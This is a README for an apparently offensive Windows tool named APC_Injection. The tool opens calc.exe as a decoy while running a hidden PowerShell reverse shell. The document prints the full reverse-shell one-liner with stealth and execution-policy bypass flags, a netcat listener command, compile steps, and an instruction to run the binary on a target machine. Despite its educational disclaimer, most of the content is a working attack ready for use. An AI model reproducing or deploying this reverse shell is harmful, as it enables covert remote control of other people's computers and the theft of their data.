# APC_Injection Program

## Overview

The **APC_Injection** program is a tool designed to demonstrate advanced process injection techniques. It includes functionalities such as launching benign programs (`calc.exe`) to mislead analysts and executing a hidden reverse shell using PowerShell for remote control. The program emphasizes stealth and modularity, with a focus on simulating real-world adversarial behaviors.

### Contents
- [Overview](#overview)
- [Features](#features)
- [Components](#components)
- [PowerShell Reverse Shell](#powershell-reverse-shell)
- [Configuration](#configuration)
- [Setting Up a Listener](#setting-up-a-listener)
- [How to Compile and Run](#how-to-compile-and-run)
- [Disclaimer](#disclaimer)

---

## Features

1. **Launch Calculator (`calc.exe`)**: Simulates benign behavior to distract from the malicious payload.
2. **Launch Reverse Shell**: Establishes a hidden reverse TCP connection for remote command execution.
3. **Stealth Execution**: Uses PowerShell commands with options such as `-NoP -NonI -W Hidden` to ensure invisibility.
4. **Modular Code**: Organized into separate files for maintainability and extensibility.

---

## Components

### 1. `Main.cpp`
The main entry point of the program:
- Calls `LaunchCalc()` to open the calculator.
- Calls `LaunchReverseShell()` to execute a reverse shell in hidden mode.

### 2. `ShellOperations.cpp`
Contains implementations for:
- `LaunchCalc()`: Opens the calculator using `system("calc.exe")`.
- `LaunchReverseShell()`: Builds and executes a PowerShell reverse shell command.

### 3. `ShellOperations.h`
Header file declaring the functions implemented in `ShellOperations.cpp`:
```cpp
#ifndef SHELL_OPERATIONS_H
#define SHELL_OPERATIONS_H

void LaunchCalc();
void LaunchReverseShell();

#endif // SHELL_OPERATIONS_H


PowerShell Reverse Shell
The reverse shell connects back to a remote listener, enabling remote command execution.

Command Structure
powershell
Copy code
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <attacker_port>);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()};
$client.Close()"
Configuration
Replace <attacker_ip> with the IP address of your machine.
Replace <attacker_port> with the port number where the listener is running (e.g., 443).
Setting Up a Listener
To receive the reverse shell connection, set up a listener on your machine.

Netcat Listener Command
bash
Copy code
ncat -lvnp 443
This command listens for incoming connections on port 443.

How to Compile and Run
Prerequisites
Operating System: Windows
Compiler: MinGW/G++
Privileges: Administrator privileges are required to execute the reverse shell.
Compilation
Use the following command to compile the program:

bash
Copy code
g++ -pipe src/Main.cpp src/ShellOperations.cpp -Iincludes -o APC_Injection.exe
Running the Program
After compilation, execute the program on the target machine:

bash
Copy code
APC_Injection.exe
Disclaimer
This program is for educational purposes only. Unauthorized use of this tool on any system without explicit permission is illegal and unethical. The authors are not responsible for any misuse of this software.

By using this program, you agree to only use it in controlled environments where explicit permission is granted for ethical hacking and educational research.


